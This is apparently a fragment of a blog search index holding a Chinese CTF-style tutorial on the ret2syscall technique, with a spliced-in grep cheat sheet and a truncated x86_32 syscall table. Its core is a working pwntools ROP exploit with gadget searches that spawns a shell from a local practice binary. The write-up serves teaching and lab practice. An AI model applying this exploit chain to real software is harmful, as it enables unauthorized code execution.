计算出system函数和&quot;/bin/sh&quot;字符串的真实地址。7.再次构造合理的payload2，劫持程序的执行流程，劫持到system(&quot;/bin/sh&quot;)的真实地址，从而拿到shell。","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"pwn-ret2syscall","slug":"pwn-ret2syscall","date":"2025-06-06T07:29:21.000Z","updated":"2025-06-09T10:26:17.954Z","comments":true,"path":"2025/06/06/pwn-ret2syscall/","permalink":"http://example.com/2025/06/06/pwn-ret2syscall/","excerpt":"pwn-ret2syscallsyscall简介syscall 就是连接用户态和内核态的桥梁 Linux系统中 用户空间通过向内核空间发出syscall 产生软中断从而让程序陷入内核态 执行相应的操作 而对于每个系统调用都会有一个对应的系统调用号 系统调用提供用户程序与操作系统间的接口 部分库函数(scanf、puts)等IO相关的函数实际上是对系统调用的封装(read和write) /usr/include/x86_64-linux-gnu/asm/unistd_64.h /usr/include/x86_64-linux-gnu/asm/unistd_32.h","text":"pwn-ret2syscallsyscall简介syscall 就是连接用户态和内核态的桥梁 Linux系统中 用户空间通过向内核空间发出syscall 产生软中断从而让程序陷入内核态 执行相应的操作 而对于每个系统调用都会有一个对应的系统调用号 系统调用提供用户程序与操作系统间的接口 部分库函数(scanf、puts)等IO相关的函数实际上是对系统调用的封装(read和write) /usr/include/x86_64-linux-gnu/asm/unistd_64.h /usr/include/x86_64-linux-gnu/asm/unistd_32.h 文本过滤✅ 一、查找包含特定内容的行1cat file.txt | grep &quot;关键词&quot; 示例： 1cat log.txt | grep &quot;error&quot; 查找 log.txt 中包含 “error” 的所有行。 ✅ 二、查找不包含关键词的行1cat file.txt | grep -v &quot;关键词&quot; ✅ 三、忽略大小写查找1cat file.txt | grep -i &quot;关键词&quot; ✅ 四、查找多关键词（正则或多个grep）1cat file.txt | grep -E &quot;error|warning&quot; 或者： 1cat file.txt | grep &quot;error&quot; | grep &quot;timeout&quot; ✅ 五、仅输出匹配内容（不含整行）1cat file.txt | grep -o &quot;关键词&quot; ✅ 六、查找上下文内容（上下几行）1cat file.txt | grep -A 2 -B 2 &quot;关键词&quot; -A 2：后2行 -B 2：前2行 -C 2：前后各2行 ✅ 七、配合 awk 精准控制输出字段例如查找包含关键词并输出第2列： 1cat file.txt | awk &#x27;/关键词/ &#123;print $2&#125;&#x27; Linux Syscall64 Reference 其中32位系统调用由 int 0x80 触发 其中64位系统调用由 syscall 触发 (表格在最后) 系统调用的传参过程系统调用与普通的函数调用不同 他的所有参数都是通过寄存器传递的(前几个参数) 这一点在32位上尤其需要区分 例如 execve 函数实际调用的就是sys_execve 是一个系统调用 32位下他的寄存器传参情况如上 将寄存器调整为 eax:0xb ebx:/bin/sh ecx:0 edx:0 之后调用 int 0x80 即可 可以使用 man 命令 进行查看参数 在32位系统调用中 传入参数的顺序是 ebx,ecx,edx,esi,edi 其中eax存放系统调用号 在64位系统调用中 传入参数的顺序是 rdi,rsi,rdx,r10,r8,r9 其中rax存放系统调用号 例题ret2syscall 先查保护 另外说一嘴 file ret2syscall ret2syscall: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=bf4950f72d65ea308335af9bb7d8b77dff2bda41, not stripped 用file可以查出该软件是否是静态编译 statically 即使静态编译 12345678(Pwn-py312) (base) cccccchow@Chow:~/pwn/AAA/山化课程/day03-ret2syscall$ checksec ret2syscall[*] &#x27;/home/cccccchow/pwn/AAA/山化课程/day03-ret2syscall/ret2syscall&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No 发现开启了NX保护 也就是说栈不可执行 然后再IDA里面也没有看到 system 以及 execve 等函数 先说下exp的写法和原理 假设： pop_rax = p64(0x4bc808) 是一个地址，里面的代码是 pop rax; ret; pop_rdi = p64(0x401626) 是 pop rdi; ret; pop_rsi = p64(0x401747) 是 pop rsi; ret; pop_rdx = p64(0x442b66) 是 pop rdx; ret; syscall = p64(0x467685) 是 syscall; ret; bs = p64(0x004a1384) 是字符串 “&#x2F;bin&#x2F;sh” 在内存中的地址 exp执行过程详解 执行 pop rax; ret： CPU跳到 pop_rax 地址 执行 pop rax，把栈顶的下一个8字节（0x3b）弹出放入 rax 寄存器 接着执行 ret，跳转到栈上接下来的地址，也就是 pop_rdi 的地址 执行 pop rdi; ret： 弹出栈顶8字节，放到 rdi 寄存器（这个值是 bs，”&#x2F;bin&#x2F;sh” 字符串地址） ret 跳转到下一个 pop_rsi 的地址 执行 pop rsi; ret： 弹出0，放入 rsi ret 跳转到 pop_rdx 执行 pop rdx; ret： 弹出0，放入 rdx ret 跳转到 syscall 执行 syscall; ret： 发起系统调用 execve(&quot;/bin/sh&quot;, NULL, NULL)，系统内核会帮你执行 /bin/sh shell 如果成功，shell就被打开了！ 栈内的数据顺序示意图（8字节为单位） 假设溢出后栈顶（rsp）指向： 栈地址（从上到下，rsp向下增长） 内容 说明 rsp + 0 pop_rax 跳转到这个地址执行 pop rax rsp + 8 0x3b pop rax后，rax&#x3D;0x3b rsp + 16 pop_rdi pop rdi; ret的地址 rsp + 24 bs (“&#x2F;bin&#x2F;sh”地址) pop rdi后，rdi&#x3D;bs rsp + 32 pop_rsi pop rsi; ret的地址 rsp + 40 0 pop rsi后，rsi&#x3D;0 rsp + 48 pop_rdx pop rdx; ret的地址 rsp + 56 0 pop rdx后，rdx&#x3D;0 rsp + 64 syscall syscall; ret的地址 每执行完一个 pop gadget，rsp 上移16字节（8字节pop值 + 8字节ret地址），执行下一条ret跳转下一个gadget。 栈顶 (rsp 指向这里，向下地址递增) +——————+ &lt;— rsp (程序开始执行ROP链时)| pop_rax | # 地址，执行 pop rax; ret;+——————+| 0x3b | # 被 pop 到 rax+——————+| pop_rdi | # 地址，执行 pop rdi; ret;+——————+| bs | # “&#x2F;bin&#x2F;sh” 地址，被 pop 到 rdi+——————+| pop_rsi | # 地址，执行 pop rsi; ret;+——————+| 0 | # 被 pop 到 rsi+——————+| pop_rdx | # 地址，执行 pop rdx; ret;+——————+| 0 | # 被 pop 到 rdx+——————+| syscall | # 地址，执行 syscall; ret;+——————+| … | # 后面可能还有其他内容 假设当前栈顶指针是 rsp，执行 pop reg 后，做了以下三件事： 从栈顶把数据取出来放到寄存器 reg也就是说，把 [rsp] 地址上的内容读出来，赋值给 reg。举例：pop rax 就是把 [rsp] 里的8字节读进 rax。 移动栈指针 rsp 向上（加8字节，64位系统）把栈顶指针 rsp 增加8（64位下，每个栈项是8字节），这样栈顶就往栈高地址方向移动，指向下一个栈元素。 执行下一条指令（通常是 ret）在ROP链中，pop 一般配合 ret 使用，ret 从栈顶取出地址跳转。 所以我们就要去构造系统调用了 先搜索一遍 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127(ret2syscall/ELF/x86_64)&gt; search syscall[INFO] Searching for gadgets: syscall[INFO] File: ret2syscall0x00000000004003da: syscall; 0x000000000046a96e: syscall; add rsp, 0x98; xor eax, eax; pop rbx; pop rbp; ret; 0x000000000043f885: syscall; cmp rax, -0x1000; ja 0x3f8d0; add rsp, 0x60; pop rbx; ret; 0x000000000046ac85: syscall; cmp rax, -0x1000; ja 0x6ac98; pop rbx; ret; 0x000000000043f5a5: syscall; cmp rax, -0xfff; jae 0x44810; ret; 0x000000000047e352: syscall; jmp 0x7e2a5; nop dword ptr [rax]; call rax; 0x0000000000442b87: syscall; pop rdx; pop rsi; ret; 0x000000000047cbed: syscall; test edx, edx; jne 0x7cbcf; mov dword ptr fs:[0x2d0], eax; ret; 0x0000000000467685: syscall; ret; (ret2syscall/ELF/x86_64)&gt; search pop rax[INFO] Searching for gadgets: pop rax[INFO] File: ret2syscall0x00000000004c3ecd: pop rax; add byte ptr [rax], al; nop; ret; 0x000000000044faba: pop rax; add rax, 0x200; mov qword ptr fs:[rdx], rax; ret; 0x00000000004c4c18: pop rax; in eax, 0xf9; jmp rax; 0x0000000000418b12: pop rax; mov dword ptr [rdi + 4], eax; ret; 0x000000000049bd15: pop rax; mov eax, dword ptr [rbx + 8]; movsxd rax, dword ptr [r14 + rax*4]; add rax, r14; jmp rax; 0x0000000000478856: pop rax; pop rdx; pop rbx; ret; 0x00000000004bc790: pop rax; ret 0x4b; 0x0000000000409b44: pop rax; ret 0xffff; 0x00000000004c0858: pop rax; cmc; jmp qword ptr [rdi + 1]; 0x00000000004bc808: pop rax; ret; (ret2syscall/ELF/x86_64)&gt; search pop rdi[INFO] Searching for gadgets: pop rdi[INFO] File: ret2syscall0x00000000004c45e5: pop rdi; add byte ptr [rax], al; test al, 9; stc; call qword ptr [rsi + 0x2b]; 0x000000000042c1ad: pop rdi; add eax, dword ptr [rax]; add byte ptr [rax - 0x7d], cl; ret 0x4910; 0x00000000004886cd: pop rdi; and al, 0; jae 0x886df; mov rdx, qword ptr [rip + 0x24445e]; add word ptr [rdx + rax*2], 1; ret; 0x0000000000431f29: pop rdi; in al, dx; mov qword ptr [rdi - 0xc], rcx; mov dword ptr [rdi - 4], edx; ret; 0x0000000000431d39: pop rdi; in eax, dx; mov qword ptr [rdi - 0xb], rcx; mov dword ptr [rdi - 4], edx; ret; 0x00000000004ba99e: pop rdi; insd dword ptr [rdi], dx; test eax, 0x7d4c8c5d; ret 0xd8f; 0x00000000004320fa: pop rdi; jmp 0x32145; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; 0x0000000000432142: pop rdi; jmp 0x3218d; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; 0x0000000000432180: pop rdi; jmp 0x321cb; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; 0x00000000004321bc: pop rdi; jmp 0x32207; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; 0x00000000004321f6: pop rdi; jmp 0x32241; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; 0x000000000043222e: pop rdi; jmp 0x32279; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; 0x0000000000432256: pop rdi; jmp 0x322a1; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; 0x000000000043227e: pop rdi; jmp 0x322c9; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; 0x00000000004324fa: pop rdi; jmp 0xfffffffff152ae48; mov qword ptr [rdi - 8], rdx; ret; 0x0000000000432542: pop rdi; jmp 0xfffffffff152ae90; mov qword ptr [rdi - 8], rdx; ret; 0x0000000000432580: pop rdi; jmp 0xfffffffff152aece; mov qword ptr [rdi - 8], rdx; ret; 0x00000000004325b8: pop rdi; jmp 0xfffffffff152af06; mov qword ptr [rdi - 8], rdx; ret; 0x00000000004325f6: pop rdi; jmp 0xfffffffff152af44; mov qword ptr [rdi - 8], rdx; ret; 0x000000000043262e: pop rdi; jmp 0xfffffffff152af7c; mov qword ptr [rdi - 8], rdx; ret; 0x0000000000432656: pop rdi; jmp 0xfffffffff152afa4; mov qword ptr [rdi - 8], rdx; ret; 0x000000000043267e: pop rdi; jmp 0xfffffffff152afcc; mov qword ptr [rdi - 8], rdx; ret; 0x0000000000441ab2: pop rdi; jmp rax; 0x000000000043b50d: pop rdi; mov al, byte ptr [rsi]; add byte ptr [rcx + 0x63], cl; or al, 0x93; lea rcx, [r11 + rcx]; jmp rcx; 0x00000000004b9961: pop rdi; mov dh, 0x4e; ret 0x474c; 0x000000000049e57e: pop rdi; mov rax, rbx; pop rbx; pop rbp; pop r12; ret; 0x0000000000431b59: pop rdi; out dx, al; mov qword ptr [rdi - 0xa], rcx; mov dword ptr [rdi - 4], edx; ret; 0x0000000000431989: pop rdi; out dx, eax; mov qword ptr [rdi - 9], r8; mov dword ptr [rdi - 4], edx; ret; 0x0000000000431a85: pop rdi; out dx, eax; mov qword ptr [rdi - 9], rcx; mov byte ptr [rdi - 1], dl; ret; 0x00000000004319d1: pop rdi; out dx, eax; mov qword ptr [rdi - 9], rcx; mov dword ptr [rdi - 4], edx; ret; 0x000000000040224a: pop rdi; pop rbp; ret; 0x00000000004c05a1: pop rdi; cmc; jmp qword ptr [rsi + 2]; 0x0000000000401626: pop rdi; ret; (ret2syscall/ELF/x86_64)&gt; search pop rsi[INFO] Searching for gadgets: pop rsi[INFO] File: ret2syscall0x000000000042c0ae: pop rsi; add al, 0; add byte ptr [rax - 0x7d], cl; ret 0xe910; 0x000000000044b242: pop rsi; add al, bpl; xchg byte ptr [rsi - 5], ah; jmp qword ptr [rsi + 0xf]; 0x0000000000473e13: pop rsi; add dword ptr [rax], eax; add byte ptr [rax + 0x39], cl; ret 0xf48; 0x000000000042642c: pop rsi; add dword ptr [rax], eax; ret; 0x000000000047377c: pop rsi; add r8b, bpl; loope 0x7377b; jmp qword ptr [rsi + 0x2e]; 0x00000000004886d6: pop rsi; and al, 0; add word ptr [rdx + rax*2], 1; ret; 0x0000000000426ed2: pop rsi; and byte ptr [rbx + rcx*4 + 0x66], cl; sub byte ptr [rbx + rcx*4 + 0x6e], cl; xor byte ptr [rbx + rcx*4 + 0x76], cl; cmp byte ptr [rax + 0xf], cl; ret; 0x000000000048f191: pop rsi; fmul st(0); ret; 0x000000000048f10f: pop rsi; fmulp st(1); ret; 0x000000000042cbb5: pop rsi; or byte ptr [rax - 0x7d], cl; ret 0x4801; 0x0000000000441ab0: pop rsi; pop r15; jmp rax; 0x0000000000402248: pop rsi; pop r15; pop rbp; ret; 0x0000000000401624: pop rsi; pop r15; ret; 0x00000000004b96dc: pop rsi; sar byte ptr [rip + 0x733db8a1], 0xd7; jo 0xb9757; mov ebp, 0xfb67d10d; ret; 0x0000000000401747: pop rsi; ret; (ret2syscall/ELF/x86_64)&gt; search pop rdx[INFO] Searching for gadgets: pop rdx[INFO] File: ret2syscall0x0000000000426099: pop rdx; add byte ptr [rax + 0x43da10], dil; cmove rax, rdx; ret; 0x00000000004c40dd: pop rdx; add byte ptr [rax], al; jo 0xc409b; clc; call qword ptr [rcx]; 0x00000000004c40f5: pop rdx; add byte ptr [rax], al; js 0xc40b3; clc; call qword ptr [rsi]; 0x00000000004269cb: pop rdx; add r11b, sil; ret; 0x0000000000461e20: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x1088], 1; mov rax, qword ptr [rax*8 + 0x4b3ba0]; jmp rax; 0x0000000000460618: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x1090], 1; mov rax, qword ptr [rax*8 + 0x4b39a0]; jmp rax; 0x0000000000461b85: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10a0], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; 0x0000000000461d38: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10a8], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; 0x0000000000461cfa: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10b0], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; 0x00000000004606ae: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10b8], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; 0x00000000004606ec: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10c8], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; 0x00000000004ba581: pop rdx; je 0xba548; ret 0xacfc; 0x00000000004b93a4: pop rdx; jp 0xb9400; cmp byte ptr [rbx + rdi*2], bh; push -0x42; outsb dx, byte ptr [rsi]; call qword ptr [rcx - 0x66]; 0x000000000047e4ee: pop rdx; or byte ptr [rcx + 3], cl; sbb al, byte ptr [rbx + 0xa3c0fe0]; jne 0x7e4ad; nop word ptr [rax + rax]; call rbx; 0x00000000004bb547: pop rdx; out 0xf5, eax; mov ch, 0xab; ret; 0x0000000000442b64: pop rdx; pop r10; ret; 0x0000000000478857: pop rdx; pop rbx; ret; 0x0000000000442b89: pop rdx; pop rsi; ret; 0x000000000048f072: pop rdx; sub bh, dh; jmp qword ptr [rsi + 0x2e]; 0x00000000004a3669: pop rdx; clc; jmp qword ptr [rax]; 0x0000000000442b66: pop rdx; ret; (ret2syscall/ELF/x86_64)&gt; search pop r10[INFO] Searching for gadgets: pop r10[INFO] File: ret2syscall0x0000000000442b65: pop r10; ret; (ret2syscall/ELF/x86_64)&gt; search pop r8[INFO] Searching for gadgets: pop r8[INFO] File: ret2syscall0x0000000000418b11: pop r8; mov dword ptr [rdi + 4], eax; ret; (ret2syscall/ELF/x86_64)&gt; search pop r9[INFO] Searching for gadgets: pop r9 搜完之后我们就去找溢出点了 如下所示 12345678910 → 0x400a09 &lt;main+005b&gt; ret [!] Cannot disassemble from $PC─────────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;ret2syscall&quot;, stopped 0x400a09 in main (), reason: SINGLE STEP───────────────────────────────────────────────────────────────────────── trace ────[#0] 0x400a09 → main()────────────────────────────────────────────────────────────────────────────────────gef➤ cyclic -l paaaaaaaFinding cyclic pattern of 8 bytes: b&#x27;paaaaaaa&#x27; (hex: 0x7061616161616161)Found at offset 120 泄漏点是 120 然后我们接着通过 ropper 搜索 /bin/sh 如下所示 1234567891011(ret2syscall/ELF/x86_64)&gt; string /bin/shStrings=======Address Value ------- ----- 0x004a1384 /bin/sh(ret2syscall/ELF/x86_64)&gt; 还得搜索一个syscall 123456789101112131415(ret2syscall/ELF/x86_64)&gt; search syscall[INFO] Searching for gadgets: syscall[INFO] File: ret2syscall0x00000000004003da: syscall; 0x000000000046a96e: syscall; add rsp, 0x98; xor eax, eax; pop rbx; pop rbp; ret; 0x000000000043f885: syscall; cmp rax, -0x1000; ja 0x3f8d0; add rsp, 0x60; pop rbx; ret; 0x000000000046ac85: syscall; cmp rax, -0x1000; ja 0x6ac98; pop rbx; ret; 0x000000000043f5a5: syscall; cmp rax, -0xfff; jae 0x44810; ret; 0x000000000047e352: syscall; jmp 0x7e2a5; nop dword ptr [rax]; call rax; 0x0000000000442b87: syscall; pop rdx; pop rsi; ret; 0x000000000047cbed: syscall; test edx, edx; jne 0x7cbcf; mov dword ptr fs:[0x2d0], eax; ret; 0x0000000000467685: syscall; ret; (ret2syscall/ELF/x86_64)&gt; exp 如下： 123456789101112131415161718192021222324252627282930313233from pwn import*p = process(&quot;ret2syscall&quot;)context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;gdb.attach(p,&quot;b main\\nc&quot;)pop_rax = p64(0x4bc808)pop_rdi = p64(0x401626)pop_rsi = p64(0x401747)pop_rdx = p64(0x442b66)syscall = p64(0x467685)# /bin/shbs = p64(0x004a1384)payload = b&#x27;a&#x27;*120# 让 正常函数的ret返回到 pop_rax 处payload +=pop_rax + p64(0x3b)payload +=pop_rdi + bspayload +=pop_rsi + p64(0)payload +=pop_rdx + p64(0)payload += syscallp.sendline(payload)p.interactive() 1. 附件：x86_32 Syscall table Num syscall %eax arg0 (%ebx) arg1 (%ecx) arg2 (%edx) arg3 (%esi) arg4 (%edi) arg5 (%ebp) 0 restart_syscall 0x00 - - - - - - 1 exit 0x01 int error_code - - - - - 2 fork 0x02 - - - - - - 3 read 0x03 unsigned int fd char *buf size_t count - - - 4 write 0x04 unsigned int fd const char *buf size_t count - - - 5 open 0x05 const char *filename int flags umode_t mode - - - 6 close 0x06 unsigned int fd - - - - - 7 waitpid 0x07 pid_t pid int *stat_addr int options - - - 8 creat 0x08 const char *pathname umode_t mode - - - - 9 link 0x09 const char *oldname const char *newname - - - - 10 unlink 0x0a const char *pathname - - - - - 11 execve 0x0b const char *filename const char *const *argv const char *const *envp - - - 12 chdir 0x0c const char *filename - - - - - 13 time 0x0d time_t *tloc - - - - - 14 mknod 0x0e const char *filename umode_t mode unsigned dev - - - 15 chmod 0x0f const char *filename umode_t mode - - - - 16 lchown 0x10 const char *filename uid_t user gid_t group - - - 17 break 0x11 ? ? ? ? ? ? 18 oldstat 0x12 ? ? ? ? ? ? 19 lseek 0x13 unsigned int fd off_t offset unsigned int whence - - - 20 getpid 0x14 - - - - - - 21 mount 0x15 char *dev_name char *dir_name char *type unsigned long flags void *data - 22 umount 0x16 char *name int flags - - - - 23 setuid 0x17 uid_t uid - - - - - 24 getuid 0x18 - - - - - - 25 stime 0x19 time_t *tptr - - - - - 26 ptrace 0x1a long request long pid unsigned long addr unsigned long data - - 27 alarm 0x1b unsigned int seconds - - - - - 28 oldfstat 0x1c ? ? ? ? ? ? 29 pause 0x1d - - - - - - 30 utime 0x1e char *filename struct utimbuf *times - - - - 31 stty 0x1f ? ? ? ? ? ? 32 gtty 0x20 ? ? ? ? ? ? 33 access 0x21 const char *filename int mode - - - - 34 nice 0x22 int increment - - - - - 35 ftime 0x23 ? ? ? ? ? ? 36 sync 0x24 - - - - - - 37 kill 0x25 pid_t pid int sig - - - - 38 rename 0x26 const char *oldname const char *newname - - - - 39 mkdir 0x27 const char *pathname umode_t mode - - - - 40 rmdir 0x28 const char *pathname - - - - - 41 dup 0x29 unsigned int fildes - - - - - 42 pipe 0x2a int *fildes - - - - - 43 times 0x2b struct tms *tbuf - - - - - 44 prof 0x2c ? ? ? ? ? ? 45 brk 0x2d unsigned long brk - - - - - 46 setgid 0x2e gid_t gid - - - - - 47 getgid 0x2f - - - - - - 48 signal 0x30 int sig __sighandler_t handler - - - - 49 geteuid 0x31 - - - - - - 50 getegid 0x32 - - - - - - 51 acct 0x33 const char *name - - - - - 52 umount2 0x34 ? ? ? ? ? ? 53 lock 0x35 ? ? ? ? ? ? 54 ioctl 0x36 unsigned int fd unsigned int cmd unsigned long arg - - - 55 fcntl 0x37 unsigned int fd unsigned int cmd unsigned long arg - - - 56 mpx 0x38 ? ? ? ? ? ? 57 setpgid 0x39 pid_t pid pid_t pgid - - - - 58 ulimit 0x3a ? ? ? ? ? ? 59 oldolduname 0x3b ? ? ? ? ? ? 60 umask 0x3c int mask - - - - - 61 chroot 0x3d const char *filename - - - - - 62 ustat 0x3e unsigned dev struct ustat *ubuf - - - - 63 dup2 0x3f unsigned int oldfd unsigned int newfd - - - - 64 getppid 0x40 - - - - - - 65 getpgrp 0x41 - - - - - - 66 setsid 0x42 - - - - - - 67 sigaction 0x43 int const struct old_sigaction * struct old_sigaction * - - - 68 sgetmask 0x44 - - - - - - 69 ssetmask 0x45 int newmask - - - - - 70 setreuid 0x46 uid_t ruid uid_t euid - - - - 71 setregid 0x47 gid_t rgid gid_t egid - - - - 72 sigsuspend 0x48 int unused1 int unused2 old_sigset_t mask - - - 73 sigpending 0x49 old_sigset_t *uset - - - - - 74 sethostname 0x4a char *name int len - - - - 75 setrlimit 0x4b unsigned int resource struct rlimit *rlim - - - - 76 getrlimit 0x4c unsigned int resource struct rlimit *rlim - - - - 77 getrusage 0x4d int who struct rusage *ru - - - - 78 gettimeofday 0x4e struct timeval *tv struct timezone *tz - - - - 79 settimeofday 0x4f struct timeval *tv struct timezone *tz - - - - 80 getgroups 0x50 int gidsetsize gid_t *grouplist - - - - 81 setgroups 0x51 int gidsetsize gid_t *grouplist - - - - 82 select 0x52 int n fd_set *inp fd_set *outp fd_set *exp struct timeval *tvp - 83 symlink 0x53 const char *old const char *new - - - - 84 oldlstat 0x54 ? ? ? ? ? ? 85 readlink 0x55 const char *path char *buf int bufsiz - - - 86 uselib 0x56 const char *library - - - - - 87 swapon 0x57 const char *specialfile int swap_flags - - - - 88 reboot 0x58 int magic1 int magic2 unsigned int cmd void *arg - - 89 readdir 0x59 ? ? ? ? ? ? 90 mmap 0x5a ? ? ? ? ? ? 91 munmap 0x5b unsigned long addr size_t len - - - - 92 truncate 0x5c const char *path long length - - - - 93 ftruncate 0x5d unsigned int fd unsigned long length - - - - 94 fchmod 0x5e unsigned int fd umode_t mode - - - - 95 fchown 0x5f unsigned int fd uid_t user gid_t group - - - 96 getpriority 0x60 int which int who - - - - 97 setpriority 0x61 int which int who int niceval - - - 98 profil 0x62 ? ? ? ? ? ? 99 statfs 0x63 const char * path struct statfs *buf - - - - 100 fstatfs 0x64 unsigned int fd struct statfs *buf - - - - 101 ioperm 0x65 unsigned long from unsigned long num int on - - - 102 socketcall 0x66 int call unsigned long *args - - - - 103 syslog 0x67 int type char *buf int len - - - 104 setitimer 0x68 int which struct itimerval *value struct itimerval *ovalue - - - 105 getitimer 0x69 int which struct itimerval *value - - - - 106 stat 0x6a const char *filename struct __old_kernel_stat *statbuf - - - - 107 lstat 0x6b const char *filename struct __old_kernel_stat *statbuf - - - - 108 fstat 0x6c unsigned int fd struct __old_kernel_stat *statbuf - - - - 109 olduname 0x6d struct oldold_utsname * - - - - - 110 iopl 0x6e ? ? ? ? ? ? 111 vhangup 0x6f - - - - - - 112 idle 0x70 ? ? ? ? ? ? 113 vm86old 0x71 ? ? ? ? ? ? 114 wait4 0x72 pid_t pid int *stat_addr int options struct rusage *ru - - 115 swapoff 0x73 const char *specialfile - - - - - 116 sysinfo 0x74 struct sysinfo *info - - - - - 117 ipc 0x75 unsigned int call int first unsigned long second unsigned long third void *ptr long fifth 118 fsync 0x76 unsigned int fd - - - - - 119 sigreturn 0x77 ? ? ? ? ? ? 120 clone 0x78 unsigned long unsigned long int * int * unsigned long - 121 setdomainname 0x79 char *name int len - - - - 122 uname 0x7a struct old_utsname * - - - - - 123 modify_ldt 0x7b ? ? ? ? ? ? 124 adjtimex 0x7c struct timex *txc_p - - - - - 125 mprotect 0x7d unsigned long start size_t len unsigned long prot - - - 126 sigprocmask 0x7e int how old_sigset_t *set old_sigset_t *oset - - - 127 create_module 0x7f ? ? ? ? ? ? 128 init_module 0x80 void *umod unsigned long len const char *uargs - - - 129 delete_module 0x81 const char *name_user unsigned int flags - - - - 130 get_kernel_syms 0x82 ? ? ? ? ? ? 131 quotactl 0x83 unsigned int cmd const char *special qid_t id void *addr - - 132 getpgid 0x84 pid_t pid - - - - - 133 fchdir 0x85 unsigned int fd - - - - - 134 bdflush 0x86 int func long data - - - - 135 sysfs 0x87 int option unsigned long arg1 unsigned long arg2 - - - 136 personality 0x88 unsigned int personality - - - - - 137 afs_syscall 0x89 ? ? ? ? ? ? 138 setfsuid 0x8a uid_t uid - - - - - 139 setfsgid 0x8b gid_t gid - - - - - 140 _llseek 0x8c ? ? ? ? ? ? 141 getdents 0x8d unsigned int fd struct linux_dirent *dirent unsigned int count - - - 142 _newselect 0x8e ? ? ? ? ? ? 143 flock 0x8f unsigned int fd unsigned int cmd - - - - 144 msync 0x90 unsigned long start size_t len int flags - - - 145 readv 0x91 unsigned long fd const struct iovec *vec unsigned long vlen - - - 146 writev 0x92 unsigned long fd const struct iovec *vec unsigned long vlen - - - 147 getsid 0x93 pid_t pid - - - - - 148 fdatasync 0x94 unsigned int fd - - - - - 149 _sysctl 0x95 ? ? ? ? ? ? 150 mlock 0x96 unsigned long start size_t len - - - - 151 munlock 0x97 unsigned long start size_t len - - - - 152 mlockall 0x98 int flags - - - - - 153 munlockall 0x99 - - - - - - 154 sched_setparam 0x9a pid_t pid struct sched_param *param - - - - 155 sched_getparam 0x9b pid_t pid struct sched_param *param - - - - 156 sched_setscheduler 0x9c pid_t pid int policy struct sched_param *param - - - 157 sched_getscheduler 0x9d pid_t pid - - - - - 158 sched_yield 0x9e - - - - - - 159 sched_get_priority_max 0x9f int policy - - - - - 160 sched_get_priority_min 0xa0 int policy - - - - - 161 sched_rr_get_interval 0xa1 pid_t pid struct timespec *interval - - - - 162 nanosleep 0xa2 struct __kernel_timespec *rqtp struct __kernel_timespec *rmtp - - - - 163 mremap 0xa3 unsigned long addr unsigned long old_len unsigned long new_len unsigned long flags unsigned long new_addr - 164 setresuid 0xa4 uid_t ruid uid_t euid uid_t suid - - - 165 getresuid 0xa5 uid_t *ruid uid_t *euid uid_t *suid - - - 166 vm86 0xa6 ? ? ? ? ? ? 167 query_module 0xa7 ? ? ? ? ? ? 168 poll 0xa8 struct pollfd *ufds unsigned int nfds int timeout - - - 169 nfsservctl 0xa9 ? ? ? ? ? ? 170 setresgid 0xaa gid_t rgid gid_t egid gid_t sgid - - - 171 getresgid 0xab gid_t *rgid gid_t *egid gid_t *sgid - - - 172 prctl 0xac int option unsigned long arg2 unsigned long arg3 unsigned long arg4 unsigned long arg5 - 173 rt_sigreturn 0xad ? ? ? ? ? ? 174 rt_sigaction 0xae int const struct sigaction * struct sigaction * size_t - - 175 rt_sigprocmask 0xaf int how sigset_t *set sigset_t *oset size_t sigsetsize - - 176 rt_sigpending 0xb0 sigset_t *set size_t sigsetsize - - - - 177 rt_sigtimedwait 0xb1 const sigset_t *uthese siginfo_t *uinfo const struct timespec *uts size_t sigsetsize - - 178 rt_sigqueueinfo 0xb2 pid_t pid int sig siginfo_t *uinfo - - - 179 rt_sigsuspend 0xb3 sigset_t *unewset size_t sigsetsize - - - - 180 pread64 0xb4 unsigned int fd char *buf size_t count loff_t pos - - 181 pwrite64 0xb5 unsigned int fd const char *buf size_t count loff_t pos - - 182 chown 0xb6 const char *filename uid_t user gid_t group - - - 183 getcwd 0xb7 char *buf unsigned long size - - - - 184 capget 0xb8 cap_user_header_t header cap_user_data_t dataptr - - - - 185 capset 0xb9 cap_user_header_t header const cap_user_data_t data - - - - 